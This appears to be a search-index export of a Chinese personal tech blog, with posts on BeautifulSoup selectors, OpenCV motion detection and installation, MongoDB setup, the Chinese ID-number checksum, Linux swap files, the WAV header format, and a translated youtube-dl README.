Soup就不能自动识别编码方式了。然后，你仅仅需要说明一下原始编码方式就可以了。\nBeautifulSoup已成为和lxml、html6lib一样出色的python解释器，为用户灵活地提供不同的解析策略或强劲的速度。\n\nCSS 选择器\n通过标签名查找\nprint(soup.select(&#x27;title&#x27;))print(soup.select(&#x27;a&#x27;))\n\n通过类名查找\nprint(soup.select(&#x27;.sister&#x27;))\n\n通过id查找\nprint(soup.select(&#x27;#link1&#x27;))\n\n组合查找\nprint(soup.select(&#x27;p #link1&#x27;))      #查找p标签中内容为id属性为link1的标签print(soup.select(&quot;head &gt; title&quot;))    #直接查找子标签(绝对路径)\n\n属性查找\n查找时还可以加入属性元素，属性需要用中括号括起来，注意属性和标签属于同一节点，所以中间不能加空格，否则会无法匹配到。\nprint(soup.select(&#x27;a[class=&quot;sister&quot;]&#x27;))print(soup.select(&#x27;a[href=&quot;http://example.com/elsie&quot;]&#x27;))\n"},{"title":"python+opencv 检测和跟踪运动物体","url":"/2017/07/08/python+opencv%20%E6%A3%80%E6%B5%8B%E5%92%8C%E8%B7%9F%E8%B8%AA%E8%BF%90%E5%8A%A8%E7%89%A9%E4%BD%93/","content":"效果展示\n\n最终效果视频\n\n\n监控+差值+黑白二值图像\n\n\n代码\n\n该程序计算量要求较低，可以部署在树莓派类的物联网设备上\n\npython包配置\nsudo pip install argparse #用于解析参数sudo pip install imutils #用于修改图片格式大小sudo apt-get install libopencv-dev  sudo apt-get install python-opencv  #安装opencv\npython代码\n代码写的相当详细，注释的极其详细，不再赘述。（python版本2.7）\n#coding:utf-8#必要的包import argparseimport datetimeimport imutilsimport timeimport cv2#创建参数解释器并解析参数ap = argparse.ArgumentParser()ap.add_argument(&quot;-v&quot;, &quot;--video&quot;, help=&quot;path to the video file&quot;)ap.add_argument(&quot;-a&quot;, &quot;--min-area&quot;, type=int, default=1000, help=&quot;minimum area size&quot;)args = vars(ap.parse_args())#如果video参数为None, 那么我们从摄像头读取数据if args.get(&quot;video&quot;, None) is None:    camera = cv2.VideoCapture(0)    originaltime = time.time()#记录时间else:    camera = cv2.VideoCapture(args[&quot;video&quot;])#初始化视频流的第一帧firstFrame = Nonenum=0#遍历视频的每一帧while True:    if time.time()-originaltime &lt;= 2:  #等待摄像机开启并稳定        (grabbed, frame) = camera.read()    else:        (grabbed, frame) = camera.read()        #调用camera.read()返回一个２元组。元组第一个值是grabbed，表明是否成功从缓冲中读取frame。元组第二个值为frame本身        text = &quot;not exist&quot;        #表明正在监控的房间“没有被占领”。如果确实有活动，就更新该字符串        if not grabbed:            break        #调整该帧的大小，转换为灰阶图像并且对其进行高斯模糊        frame = imutils.resize(frame, width = 500)        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)#灰阶图片        gray = cv2.GaussianBlur(gray, (21, 21), 0)#高斯模糊        #如果第一帧是None, 对其进行初始化        if firstFrame is None:            firstFrame = gray            continue        #计算当前帧和第一帧的不同        frameDelta = cv2.absdiff(firstFrame, gray)#两幅图的差的绝对值输出到另一幅图上面来        thresh = cv2.threshold(frameDelta, 25, 255, cv2.THRESH_BINARY)[1]#黑白二值化        #扩展阈值图像填充孔洞，然后找到阈值图像上的轮廓        thresh = cv2.dilate(thresh, None, iterations = 2)#图像膨胀        (cnts, _) = cv2.findContours(thresh.copy(), cv2.RETR_EXTERNAL,                                     cv2.CHAIN_APPROX_SIMPLE                                     )#findcontours函数会“原地”修改输入的图像,只检测的外轮廓，仅保存矩形４个顶点        #遍历轮廓        for c in cnts:            #如果轮廓太小，忽视轮廓            if cv2.contourArea(c)&lt;args[&quot;min_area&quot;]:                continue            #计算轮廓边界，在当前帧中画出该框，并更新text            (x, y, w, h) = cv2.boundingRect(c)            cv2.rectangle(frame, (x, y), (x + w,y + h), (0, 255, 255), 2)            text = &quot;exist&quot;        #在当前帧上写文字以及时间戳        cv2.putText(frame, &quot;room stats:&#123;&#125;&quot;.format(text), (10, 20),                    cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 0, 255), 1)        cv2.putText(frame, datetime.datetime.now().strftime(&quot;%A %d %B %Y %I:%M:%S%p&quot;),                    (10, frame.shape[0] - 10), cv2.FONT_HERSHEY_SIMPLEX, 0.4, (0, 0, 255), 1)        #显示当前帧        cv2.imshow(&quot;二值化图像&quot;, thresh)        cv2.imshow(&quot;差值图像&quot;, frameDelta)        cv2.imshow(&quot;监控&quot;, frame)        cv2.waitKey(10)        #对环境渐变的适应        flag = True#标记是否值得更新（第一帧）背景帧        for c in cnts:            if cv2.contourArea(c)&gt;args[&quot;min_area&quot;]//4:                flag = False        if  flag is True:#新背景＝旧背景＊(1-0.618)＋当前无物体背景＊(0.618)            firstFrame = cv2.addWeighted(firstFrame, 1-0.618, gray, 0.618, 0.0)        #cv2.imwrite(&quot;Security Feed.png&quot;, frame)        #cv2.imwrite(&quot;Thresh.png&quot;, thresh)        #cv2.imwrite(&quot;Frame delta.png&quot;, frameDelta)        #cv2.waitKey(0)#清理摄像机资源并关闭打开的窗口camera.release()cv2.destroyAllWindows()\n"},{"title":"ubuntu17.04环境下opencv3.2.0配置","url":"/2017/08/10/ubuntu17.04%E7%8E%AF%E5%A2%83%E4%B8%8Bopencv3.2.0%E9%85%8D%E7%BD%AE/","content":"\n实验环境\n\nCPU：Ryzen 1800x\n系统：ubuntu 17.04 64bit\n软件环境：python2.7 + python3.5 + cuda开发环境（cuda8.0 cuddn\n5.1）\n\n因实验要求，需要对图片进行灰度编码，自然而然想到利用openCV库结合python进行，但由于系统较新，且网上教程多为老版本，新教程也有些小错误，特记下配置过程\n\n预配置环境：openCV 3.2.0(cuda加速+python3环境+contrib扩展包)\n\nopenCV基础环境配置\n\n对源的更新\n\nsudo apt-get uupdatesudo apt-get update\n\n环境搭建\n\nsudo apt-get install build-essential cmake cmake-qt-gui pkg-config git\n\n图像格式相关\n\nsudo apt-get install libpng-dev libjpeg-dev libtiff5-dev\n\nGUI相关\n\nsudo apt-get install libgtk2.0-dev\n\n视频格式相关\n\nsudo apt-get install libavcodec-dev libavformat-dev libswscale-dev libv4l-dev\n\nC++多线程相关\n\nsudo apt-get install libtbb2 libtbb-dev\n\n摄像头相关\n\nsudo apt-get install libdc1394-22-dev\n\nopenGL相关\n\nsudo apt-get install libgtkglext1 libgtkglext1-dev\n注意：针对可选安装libjasper-dev包，该包是针对图像格式JPEG-2000的开发包。在最新的ubuntu17.04中，已放弃对该包的安装支持，如涉及到对该格式的处理，可以到https://packages.ubuntu.com/trusty/libjasper-dev\nubuntu的官方包管理网址获取，该包需要依赖包libjasper1，请一并下载。但两包无法直接通过ubuntu软件安装器安装，可以通过dpkg命令安装：\nsudo dpkg -i &lt;package.deb&gt;\nopenCV下载与本地编译\n这次安装版本为3.2.0，需要下载opencv-3.2.0与opencv_contrib-3.2.0（后者会在cmake配置的时候用到），这是因为opencv3以后SIFT和SURF之类的属性被移到了contrib中。\n下载采用wget命令：\n# 从github上直接下载或者clone也可wget https://github.com/opencv/opencv/archive/3.2.0.zip -O opencv-3.2.0.zipwget https://github.com/opencv/opencv_contrib/archive/3.2.0.zip -O opencv_contrib-3.2.0.zip\n分别解压文件：\nunzip opencv-3.2.0.zipunzip opencv_contrib-3.2.0.zip\n获得opencv-3.2.0与opencv_contrib-3.2.0两个文件夹，打开opencv3.2.0文件夹\n新建build文件夹，作为编译文件路径：\ncd opencv-3.2.0mkdir build\n打开cmake图形界面：\nsudo cmake-gui\n\n打开cmake图形界面，源码位置设置为opencv-3.2.0文件夹，binaries(二进制文件)位置设为新建build文件夹位置；\n在search框输入opengl，勾选上（为了避免opengl版本问题导致的不兼容，这里最好选择使用opencv自带的openGL；\n在search框输入opencv_extra_modules_path，在后面value值处填上两个包中另一个opencv_contrib-3.2.0下modules的路径；\n然后点击configure，cmake会自动进行参数检测，并下载一些相关包；\n\n注意：可能遇到ippicv_linux_20151201.tgz文件下载失败的问题，（墙的原因），解决办法为百度搜索下载（例如CSDN下载http://download.csdn.net/download/lx928525166/9479919，并cp命令复制到/opencv-3.2.0/3rdparty/ippicv/downloads/linux-808b791a6eac9ed78d32a7666804320e文件夹下。（最后一个文件夹名可能不一样）\n\n最后cmake中点击Generate，生成编译文件；\n然后cd命令进build文件夹\n\nsudo make -j16 # -j后面数字为采用线程数，根据个人配置而定sudo make install\n\n进度到100%表示安装成功。\n\npython环境的绑定\n我们已经成功安装openCV，且在配置时openCV会自动与python进行绑定，我们可以通过以下方式进行测试：\n\n重启\nsudo reboot\nsudo reboot\n测试，在python中，若无报错，即可认为绑定成功。\nimport cv2\n\n我们也可以通过安装预编译的第三方所提供的openCV\npip install opencv-python opencv-contrib-python\n"},{"title":"win64环境aishub数据爬虫配置方案","url":"/2017/05/24/win64%E7%8E%AF%E5%A2%83aishub%E6%95%B0%E6%8D%AE%E7%88%AC%E8%99%AB%E9%85%8D%E7%BD%AE%E6%96%B9%E6%A1%88/","content":"\nPython 3.6.1\n\n下载地址：python-3.6.1-amd64.exe\n系统需求：64位/32位\n备注：python需加入系统path，并能够以python链接到\n\nMongodb 3.4.4\n\n下载地址：mongodb-win32-x86_64-2008plus-ssl-3.4.4-signed.msi\n系统需求：64位\n安装位置：C:\\mongoDB3.4.4\n系统path：C:\\mongoDB3.4.4\\bin\n配置文件位置：C:\\mongoDB3.4.4\\bin\\mongodb.config\nconfig文件内容：\n\n\n数据库文件目录： dbpath=C:/mongoDB3.4.4/data\n\n\n日志目录： logpath=C:/mongoDB3.4.4/log/mongo.log diaglog=3\n\n\n安装服务至系统服务\n\nmongod –config C:\\mongoDB3.4.4\\bin\\mongodb.config –install\n\n启动与关闭mongoDB：\n\nnet start MongoDBnet stop MongoDB       \n\n查看aishub数据库状态命令：\n\nmongo use aishubdb.status()\n\n数据导出命令(默认csv格式)：\n\nmongoexport -d aishub -c sheet1 -o c:\\data.csv\n\n数据集合（sheet1）删除\n\nuse aishubdb.sheet1.drop()\nPython 依赖包\nPip 国内源\n阿里云 http://mirrors.aliyun.com/pypi/simple/\n中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/\n豆瓣 http://pypi.douban.com/simple/\n清华大学 https://pypi.tuna.tsinghua.edu.cn/simple/\n中国科学技术大学 http://pypi.mirrors.ustc.edu.cn/simple/pip\npip使用\n后面加上-i参数，指定pip源\npip install scrapy -i https://pypi.tuna.tsinghua.edu.cn/simple\nPip更新\npython -m pip install –upgrade pip \n依赖包\n\nbeautifulsoup4\nrequests\npymongo\nlxml\n\n"},{"title":"“中华人民共和国公民身份号码” 验证算法","url":"/2021/05/31/%E2%80%9C%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%85%AC%E6%B0%91%E8%BA%AB%E4%BB%BD%E5%8F%B7%E7%A0%81%E2%80%9D%20%E9%AA%8C%E8%AF%81%E7%AE%97%E6%B3%95/","content":"\n“中华人民共和国公民身份号码”\n验证算法\n中华人民共和国公民身份号码由18位组成，其中前17位由阿拉伯数字0~9组成，最后一位由0~9或X\n构成，按构造顺序如下：\n\n\n\n\n\n\n\n\n\n\n位置\n长度\n说明\n\n\n\n\n区域码\n1~6位\n6\n指公民常住户口所在地的行政划区代码，由省（2位）+市（2位）+区（县）（2位）构成\n\n\n出生日期码\n7~14位\n8\n指公民出生的公历日期，由年（4位）+月（2位）+日（2位）构成\n\n\n顺序码\n15、16位\n2\n表示在同一区域码所标识的区域范围内，对同年、同月、同日出生的人编定的顺序号\n\n\n性别码\n17位\n1\n奇数代表男性，偶数代表女性\n\n\n校验码\n18位\n1\n通过前17位计算所得，见国标GB11643-1999\n\n\n\n根据标准，最后一位校验码采用ISO\n7064:1983.MOD 11-2校验码计算法，具体计算方法解释如下，令Ni(i = 1, 2...16, 17)表示每一位身份证号，需要首先计算各位的权重Wi： Wi = 217 − (i − 1) mod  11\n计算所得权重数据如下表：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n位数i\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n\n权重Wi\n7\n9\n10\n5\n8\n4\n2\n1\n6\n3\n7\n9\n10\n5\n8\n4\n2\n\n\n\n最后一位校验码 C\n由下式计算而出： $$\nC= (12 - (\\sum_{i=1}^{17}{(N_i W_i)} \\mod 11 ) \\mod 11\n$$ 可以发现，C因为最后与11求余计算，导致C必然小于等于10。又因为阿拉伯数字限制，如果C = 10，则校验码为字符”X”；如果C ≤ 10，则校验码为数字”C”。\n我们可以根据计算前17位身份证码所得校验码与所提供的第18位校验码进行是否相等判定，从而得出所输入的18位身份证号是否有误。这也是一些网站初步验证身份证号的机制。\n\n附上本人所写的一个提取身份号码有关信息的小工具——“中华人民共和国公民身份号码”验证工具\n\n"},{"title":"世界，您好！","url":"/2017/05/24/%E4%B8%96%E7%95%8C%EF%BC%8C%E6%82%A8%E5%A5%BD%EF%BC%81/","content":"\n\n\n这是smile先生的第一个博客\n我不希望她 被废弃\n我会好好的 维护她\n正如 《我的梦》\n借用自己的空闲时间\n实现自己的 小小梦想\n"},{"title":"为Linux增加swap分区的方法","url":"/2018/07/25/%E4%B8%BALinux%E5%A2%9E%E5%8A%A0swap%E5%88%86%E5%8C%BA%E7%9A%84%E6%96%B9%E6%B3%95/","content":"\n用文件作为Swap分区\n\n创建要作为swap分区的文件:增加1GB大小的交换分区，则命令写法如下\n\ndd if=/dev/zero of=/root/swapfile bs=1M count=1024\n\n文件大小 size = bs * count if 为输入文件， of 指定输出文件\n\n\n格式化为交换分区文件\n\nmkswap /root/swapfile \t\t\t# 建立swap的文件系统\n\n启用交换分区文件\n\nswapon /root/swapfile \t\t\t# 启用swap文件\n\n系统开机时自启用\n\nsudo nano /etc/fstab \t\t\t# 在文件/etc/fstab中添加一行/root/swapfile swap swap defaults 0 0\n"},{"title":"wav文件格式编码分析","url":"/2017/10/01/wav%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E7%BC%96%E7%A0%81%E5%88%86%E6%9E%90/","content":"\nWAV作为音频文件，其格式规则由微软和IBM共同制定。常用作无压缩的文件格式。\n作为音频文件，文件特征包括：声道数，量化位数(8bit, 16bit, 24bit)，取样频率(16khz, 22khz……)\nwav格式文件所占容量(B) = (取样频率 * 量化位数 * 声道数) * 时间/8，除以8\n的原因是因为 1字节 = 8bit\n为了方便查看具体的编码的细节，我们首先先介绍下Ubuntu下一款16进制的文本查看器hexdump，其相应参数说明如下：\n\nhexdump -C &lt;==\n规范的十六进制和ASCII码显示（Canonical hex+ASCII display ）\nhexdump -b &lt;== 单字节八进制显示（One-byte octal\ndisplay）\nhexdump -c &lt;== 单字节字符显示（One-byte\ncharacter display）\nhexdump -d &lt;== 双字节十进制显示（Two-byte\ndecimal display）\nhexdump -o &lt;== 双字节八进制显示（Two-byte octal\ndisplay）\nhexdump -x &lt;== 双字节十六进制显示（Two-byte\nhexadecimal display）\n\n比较来比较去，还是hexdump\n-C的显示效果更好些。\n具体的编码方式定义如下：\n\n\n\n\n\n\n\n\n\n起始地址\n大小(byte)\n数据块类型\n内容\n\n\n\n\n00H\n4\n字符\n资源交换文件标志（RIFF）\n\n\n04H\n4\n长整数\n从下个地址开始到文件尾的总字节数\n\n\n08H\n4\n字符\nWAV文件标志（WAVE）\n\n\n0CH\n4\n字符\n波形格式标志（fmt\n），最后一位空格。\n\n\n10H\n4\n整数\n过滤字节（一般为00000010H），若为00000012H则说明数据头携带附加信息（见“附加信息”）。\n\n\n14H\n2\n整数\n为1时表示线性PCM编码，大于1时表示有压缩的编码。这里是0001H\n\n\n16H\n2\n整数\n通道数，1为单声道，2为双声道。这里是0001H。\n\n\n18H\n4\n长整数\n采样频率，这里00001f40H = 8000 Hz\n\n\n1CH\n4\n长整数\nbyte率（每秒平均字节数） =\n采样频率×通道数×位数/8 003e80H = 16000 = 8000116/8\n\n\n20H\n2\n整数\nDATA数据块长度（字节）\n\n\n22H\n2\n整数\nPCM\n位宽，0010H即16，一个量化样本占2byte。\n\n\n随后2字节\n2\n整数\n附加信息（可选，由上方过滤字节确定）\n\n\n随后4字节\n4\n字符\n数据标示符（data）\n\n\n随后4字节\n4\n长整数\nDATA总数据长度字节\n\n\n随后\n\n\nDATA数据块 00a640H = 42560\n\n\n\n"},{"title":"youtube-dl 项目README翻译","url":"/2019/03/22/youtube-dl%20%E9%A1%B9%E7%9B%AEREADME%E7%BF%BB%E8%AF%91/","content":"该文章是对youtube-dl\n项目README.md文件的翻译，项目地址：https://github.com/ytdl-org/youtube-dl/blob/master/README.md#readme\n当前版本：v2019.03.18\n\nyoutube-dl - 从youtube.com或其他视频平台下载视频\n\n安装\n描述\n选项\n参数\n输出模板\n格式选择\n视频选择\n常见问题\n开发者向导\n嵌入\nYOUTUBE-DL\nBUGS\n版权\n\n安装\n立即为所有UNIX用户安装 (如Linux, macOS, 等)，输入：\nsudo curl -L https://yt-dl.org/downloads/latest/youtube-dl -o /usr/local/bin/youtube-dlsudo chmod a+rx /usr/local/bin/youtube-dl\n如果你没有curl工具， 你也可以使用相近的wget工具：\nsudo wget https://yt-dl.org/downloads/latest/youtube-dl -O /usr/local/bin/youtube-dlsudo chmod a+rx /usr/local/bin/youtube-dl\nWindows用户可以 下载exe文件\n并且放在除了%SYSTEMROOT%\\System32以外任何的PATH 位置\n(例如：不要 放在 C:\\Windows\\System32).\n你也可以通过pip安装：\nsudo -H pip install --upgrade youtube-dl\n如果你早已安装youtube-dl，该命令行将会更新它。想获取更多信息，请参阅\npypi page。\nmacOS用户可以通过Homebrew工具来安装youtube-dl：\nbrew install youtube-dl\n或则使用 MacPorts工具：\nsudo port install youtube-dl\n此外，参考 开发者向导\n来查看如何使用git仓库。 想获取包括PGP签名的更多选项，请参阅youtube-dl\n下载界面。\n描述\nyoutube-dl是一款命令行工具，可以从YouTube.com和一些其他站点下载视频。它依赖于Python解释器，解释器版本要求为\n2.6, 2.7, 或者\n3.2+，并不限制于特定平台。它应该可以运行在类Unix，Windows和macOS平台上。其被发布于公共域，\n意味着你可以修改、重新分发、或凭个人意愿使用它。\nyoutube-dl [OPTIONS] URL [URL...]\n选项\n-h, --help\t\t\t\t\t\t打印帮助文档并退出--version\t\t\t\t\t\t打印程序版本信息并退出-U, --update\t\t\t\t\t更新程序至最新版本，需保证拥有足够权限（如需可使用sudo命令）-i, --ignore-errors\t\t\t\t当下载错误时继续，例如在播放列表跳过不可获取视频--abort-on-error\t\t\t\t当下载错误时停止下载其他视频（例如在播放列表和命令行）--dump-user-agent\t\t\t\t展示当前浏览器标识--list-extractors\t\t\t\t列出所有的提取器--extractor-descriptions\t\t输出所有支持的提取器描述--force-generic-extractor\t\t强制使用通用提取器--default-search PREFIX \t\t使用前缀补全不完整的URLs。例如“gvsearch2:”利用youtube-dl从google视频中下载两个有关“大苹果”的视频，使用&quot;auto&quot;参数让youtube-dl自行猜一个（猜测时，&quot;auto_warning&quot;将会抛出）。&quot;error&quot;参数就会抛出错误。默认值&quot;fixup_error&quot;会修复不完整URLs，如果不是搜索相关就无法实现，会抛出错误。--ignore-config      \t\t\t当使用全局配置文件/etc/youtube-dl.conf时，不再读取用户的配置文件~/.config/youtube-dl/config（Windows下为%APPDATA%/youtube-dl/config.txt）--config-location PATH\t\t\t配置文件的配置，既可以是配置文件的路径或包含其的目录--flat-playlist\t\t\t\t\t仅列出视频列表而不下载--mark-watched \t\t\t\t\t标记看过此视频（仅对YouTube）--no-mark-watched\t\t\t\t不标记看过此视频（仅对YouTube）--no-color\t\t\t\t\t\t对屏幕输出结果不上色\n网络选项:\n--proxy URL\t\t\t\t\t\t使用HTTP/HTTPS/SOCKS代理。需指定一个具体的协议，例如：socks5://127.0.0.1:1080/。传入空字段（--proxy &quot;&quot;）将会直连--socket-timeout SECONDS\t\t放弃连接前的等待时间，秒为单位--source-address IP\t\t\t\t绑定客户端的IP地址-4, --force-ipv4\t\t\t\t所有连接强制走IPv4协议-6, --force-ipv6\t\t\t\t所有连接强制走IPv6协议\n地区限制:\n--geo-verification-proxy URL\t在一些地区限制网址使用代理IP地址。由--proxy指定的默认代理（如果该选项不存在，则为none）用于实际下载。--geo-bypass\t\t\t\t\t通过伪装HTTP头：X-Forwarded-For 来绕过地区限制 --no-geo-bypass\t\t\t\t\t不用伪装HTTP头：X-Forwarded-For 来绕过地区限制--geo-bypass-country CODE\t\t利用提供具体的双字母ISO 3166-2国别码强制绕过地区限制--geo-bypass-ip-block IP_BLOCK\t使用CIDR表示法中明确提供的IP块强制绕过地理限制\n视频选择:\n--playlist-start NUMBER\t\t\t播放列表中从第几个开始下载（默认是1）--playlist-end NUMBER\t\t\t播放列表中到第几个结束下载（默认最后一个）--playlist-items ITEM_SPEC\t\t指定列表中要下载的视频项目编号。如：&quot;--playlist-items 1,2,5,8&quot;或&quot;--playlist-items 1-3,7,10-13&quot;--match-title REGEX\t\t\t\t下载标题匹配的视频（可用正则表达式或区分大小写的子字符串）--reject-title REGEX\t\t\t跳过下载标题匹配的视频（可用正则表达式或区分大小写的子字符串）--max-downloads NUMBER\t\t\t下载NUMBER个文件后中止--min-filesize SIZE\t\t\t\t不下载小于SIZE的视频（例如：50k或44.6m）--max-filesize SIZE\t\t\t\t不下载大于SIZE的视频（例如：50k或44.6m）--date DATE\t\t\t\t\t\t仅下载指定上传日期的视频--datebefore DATE\t\t\t\t仅下载指定上传日期或之前的视频--dateafter DATE\t\t\t\t仅下载指定上传日期或之后的视频--min-views COUNT\t\t\t\t不下载观看次数小于COUNT的视频--max-views COUNT\t\t\t\t不下载观看次数大于COUNT的视频--match-filter FILTER\t\t\t通用视频过滤器。可指定任何键（有关可用key列表，请参阅“OUTPUT TEMPLATE”）!key检查密钥是否不存在,key&gt;NUMBER（如“comment_count&gt; 12”，也适用于&gt; =，&lt;，&lt;=，!=，=） 比较一个数字，key =&#x27;LITERAL&#x27;（比如“uploader =&#x27;Mike Smith&#x27;，也适用于!=）来匹配字符串文字可用&amp;实现多个匹配。 除非您在参数后加问号（?），否则将排除未知的值。例如，要仅匹配已liked超过100次并且disliked不到50次的视频（或者在给定视频中不可用的不喜欢功能）并且有视频描述，请使用--match-filter &quot;like_count &gt; 100&amp;dislike_count &lt;? 50 &amp; description&quot;。--no-playlist\t\t\t\t\t如果URL指向视频和播放列表，则仅下载视频--yes-playlist\t\t\t\t\t如果URL指向视频和播放列表，则仅下载播放列表--age-limit YEARS\t\t\t\t仅下载适合特定年龄的视频--download-archive FILE\t\t\t仅下载存档文件中未列出的视频。记录下载所有视频的ID。--include-ads\t\t\t\t\t下载时同时下载广告（实验性功能）\n下载选项:\n-r, --limit-rate RATE\t\t\t最大下载速率（bps）（例如 50K 或 4.2M）-R, --retries RETRIES\t\t\t重试次数。（默认10，可选 &quot;infinite&quot;）--fragment-retries RETRIES\t\t片段重试次数（默认10），可选 &quot;infinite&quot;）(DASH, hlsnative and ISM)--skip-unavailable-fragments   \t跳过不可用片段 (DASH, hlsnative and ISM)--abort-on-unavailable-fragment\t当片段不可获取时，中断下载--keep-fragments\t\t\t\t下载完成后，将下载的片段保存在磁盘上; 片段默认被删除--buffer-size SIZE\t\t\t\t下载缓存大小（例如 1024 或 16K）（默认 1024）--no-resize-buffer\t\t\t\t不自动调整缓存大小。默认情况下，缓存大小会基于初始大小自动调整--http-chunk-size SIZE\t\t\t基于块的HTTP下载的块的大小（例如10485760或10M）（默认为禁用）。 可能有助于绕过网络服务器强加的带宽限制（实验性功能）                  --playlist-reverse\t\t\t\t逆序下载视频列表--playlist-random\t\t\t\t随机顺序下载视频列表--xattr-set-filesize\t\t\t设定xattribute ytdl文件大小--hls-prefer-native\t\t\t\t使用原生HLS代替ffmpeg进行下载--hls-prefer-ffmpeg\t\t\t\t使用ffmpeg代替原生HLS进行下载--hls-use-mpegts\t\t\t\t使用mpegts容器获取HLS视频，允许在下载时播放视频（某些播放器可能无法播放）--external-downloader COMMAND\t使用指定的外部下载程序。目前支持aria2c，avconv，axel，curl，ffmpeg，httpie，wget--external-downloader-args ARGS 为外部下载器指定参数\n文件系统选项:\n-a, --batch-file FILE            File containing URLs to download (&#x27;-&#x27; for                                 stdin), one URL per line. Lines starting                                 with &#x27;#&#x27;, &#x27;;&#x27; or &#x27;]&#x27; are considered as                                 comments and ignored.--id                             Use only video ID in file name-o, --output TEMPLATE            Output filename template, see the &quot;OUTPUT                                 TEMPLATE&quot; for all the info--autonumber-start NUMBER        Specify the start value for %(autonumber)s                                 (default is 1)--restrict-filenames             Restrict filenames to only ASCII                                 characters, and avoid &quot;&amp;&quot; and spaces in                                 filenames-w, --no-overwrites              Do not overwrite files-c, --continue                   Force resume of partially downloaded files.                                 By default, youtube-dl will resume                                 downloads if possible.--no-continue                    Do not resume partially downloaded files                                 (restart from beginning)--no-part                        Do not use .part files - write directly                                 into output file--no-mtime                       Do not use the Last-modified header to set                                 the file modification time--write-description              Write video description to a .description                                 file--write-info-json                Write video metadata to a .info.json file--write-annotations              Write video annotations to a                                 .annotations.xml file--load-info-json FILE            JSON file containing the video information                                 (created with the &quot;--write-info-json&quot;                                 option)--cookies FILE                   File to read cookies from and dump cookie                                 jar in--cache-dir DIR                  Location in the filesystem where youtube-dl                                 can store some downloaded information                                 permanently. By default                                 $XDG_CACHE_HOME/youtube-dl or                                 ~/.cache/youtube-dl . At the moment, only                                 YouTube player files (for videos with                                 obfuscated signatures) are cached, but that                                 may change.--no-cache-dir                   Disable filesystem caching--rm-cache-dir                   Delete all filesystem cache files\nThumbnail images:\n--write-thumbnail                Write thumbnail image to disk--write-all-thumbnails           Write all thumbnail image formats to disk--list-thumbnails                Simulate and list all available thumbnail                                 formats\nVerbosity / Simulation\nOptions:\n-q, --quiet                      Activate quiet mode--no-warnings                    Ignore warnings-s, --simulate                   Do not download the video and do not write                                 anything to disk--skip-download                  Do not download the video-g, --get-url                    Simulate, quiet but print URL-e, --get-title                  Simulate, quiet but print title--get-id                         Simulate, quiet but print id--get-thumbnail                  Simulate, quiet but print thumbnail URL--get-description                Simulate, quiet but print video description--get-duration                   Simulate, quiet but print video length--get-filename                   Simulate, quiet but print output filename--get-format                     Simulate, quiet but print output format-j, --dump-json                  Simulate, quiet but print JSON information.                                 See the &quot;OUTPUT TEMPLATE&quot; for a description                                 of available keys.-J, --dump-single-json           Simulate, quiet but print JSON information                                 for each command-line argument. If the URL                                 refers to a playlist, dump the whole                                 playlist information in a single line.--print-json                     Be quiet and print the video information as                                 JSON (video is still being downloaded).--newline                        Output progress bar as new lines--no-progress                    Do not print progress bar--console-title                  Display progress in console titlebar-v, --verbose                    Print various debugging information--dump-pages                     Print downloaded pages encoded using base64                                 to debug problems (very verbose)--write-pages                    Write downloaded intermediary pages to                                 files in the current directory to debug                                 problems--print-traffic                  Display sent and read HTTP traffic-C, --call-home                  Contact the youtube-dl server for debugging--no-call-home                   Do NOT contact the youtube-dl server for                                 debugging\nWorkarounds:\n--encoding ENCODING              Force the specified encoding (experimental)--no-check-certificate           Suppress HTTPS certificate validation--prefer-insecure                Use an unencrypted connection to retrieve                                 information about the video. (Currently                                 supported only for YouTube)--user-agent UA                  Specify a custom user agent--referer URL                    Specify a custom referer, use if the video                                 access is restricted to one domain--add-header FIELD:VALUE         Specify a custom HTTP header and its value,                                 separated by a colon &#x27;:&#x27;. You can use this                                 option multiple times--bidi-workaround                Work around terminals that lack                                 bidirectional text support. Requires bidiv                                 or fribidi executable in PATH--sleep-interval SECONDS         Number of seconds to sleep before each                                 download when used alone or a lower bound                                 of a range for randomized sleep before each                                 download (minimum possible number of                                 seconds to sleep) when used along with                                 --max-sleep-interval.--max-sleep-interval SECONDS     Upper bound of a range for randomized sleep                                 before each download (maximum possible                                 number of seconds to sleep). Must only be                                 used along with --min-sleep-interval.\nVideo Format Options:\n-f, --format FORMAT              Video format code, see the &quot;FORMAT                                 SELECTION&quot; for all the info--all-formats                    Download all available video formats--prefer-free-formats            Prefer free video formats unless a specific                                 one is requested-F, --list-formats               List all available formats of requested                                 videos--youtube-skip-dash-manifest     Do not download the DASH manifests and                                 related data on YouTube videos--merge-output-format FORMAT     If a merge is required (e.g.                                 bestvideo+bestaudio), output to given                                 container format. One of mkv, mp4, ogg,                                 webm, flv. Ignored if no merge is required\nSubtitle Options:\n--write-sub                      Write subtitle file--write-auto-sub                 Write automatically generated subtitle file                                 (YouTube only)--all-subs                       Download all the available subtitles of the                                 video--list-subs                      List all available subtitles for the video--sub-format FORMAT              Subtitle format, accepts formats                                 preference, for example: &quot;srt&quot; or                                 &quot;ass/srt/best&quot;--sub-lang LANGS                 Languages of the subtitles to download                                 (optional) separated by commas, use --list-                                 subs for available language tags\nAuthentication Options:\n-u, --username USERNAME          Login with this account ID-p, --password PASSWORD          Account password. If this option is left                                 out, youtube-dl will ask interactively.-2, --twofactor TWOFACTOR        Two-factor authentication code-n, --netrc                      Use .netrc authentication data--video-password PASSWORD        Video password (vimeo, smotri, youku)\nAdobe Pass Options:\n--ap-mso MSO                     Adobe Pass multiple-system operator (TV                                 provider) identifier, use --ap-list-mso for                                 a list of available MSOs--ap-username USERNAME           Multiple-system operator account login--ap-password PASSWORD           Multiple-system operator account password.                                 If this option is left out, youtube-dl will                                 ask interactively.--ap-list-mso                    List all supported multiple-system                                 operators\nPost-processing Options:\n-x, --extract-audio              Convert video files to audio-only files                                 (requires ffmpeg or avconv and ffprobe or                                 avprobe)--audio-format FORMAT            Specify audio format: &quot;best&quot;, &quot;aac&quot;,                                 &quot;flac&quot;, &quot;mp3&quot;, &quot;m4a&quot;, &quot;opus&quot;, &quot;vorbis&quot;, or                                 &quot;wav&quot;; &quot;best&quot; by default; No effect without                                 -x--audio-quality QUALITY          Specify ffmpeg/avconv audio quality, insert           